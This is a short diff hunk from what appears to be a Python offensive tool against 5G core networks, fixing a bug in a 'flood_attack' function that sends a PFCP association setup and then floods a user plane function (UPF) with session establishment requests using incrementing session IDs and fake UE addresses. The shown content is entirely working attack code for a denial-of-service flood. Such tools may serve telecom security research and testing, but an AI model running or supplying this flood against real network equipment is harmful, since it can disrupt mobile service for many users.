@@ -323,7 +323,7 @@ def flood_attack(evil_addr, upf_addr, src_port, dest_port, count, ue_base_addr="
     pfcp_obj = Ez_PFCP(evil_addr, upf_addr, src_port, dest_port)
     pfcp_obj.Send_PFCP_association_setup_req()
     for i in range(count):
-        pfcp_obj.Send_PFCP_session_establishment_req(seid=increment_monseid, ue_addr=increment_base_addr_bidon())
+        pfcp_obj.Send_PFCP_session_establishment_req(seid=increment_monseid(), ue_addr=increment_base_addr_bidon())
         
 
 
